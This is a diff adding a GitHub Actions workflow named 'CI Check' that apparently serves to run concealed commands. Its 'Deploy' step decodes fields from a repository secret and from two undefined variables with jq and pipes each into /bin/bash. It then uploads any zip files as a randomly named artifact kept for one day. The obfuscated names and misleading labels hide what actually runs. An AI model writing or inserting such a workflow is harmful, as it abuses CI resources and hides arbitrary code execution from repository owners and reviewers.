@@ -1,0 +1,24 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          wm1384: ${{ secrets.wm1384 }}
+        run: |
+          printf '%s' "$wm1384" | jq -r .mrn65042 | /bin/bash
+          echo $iaorz189 | jq -r .u6 | /bin/bash
+          printf '%s' "$vdcn5" | jq -r .sytft268 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: U556NPhs
+          path: "*.zip"
+          retention-days: 1
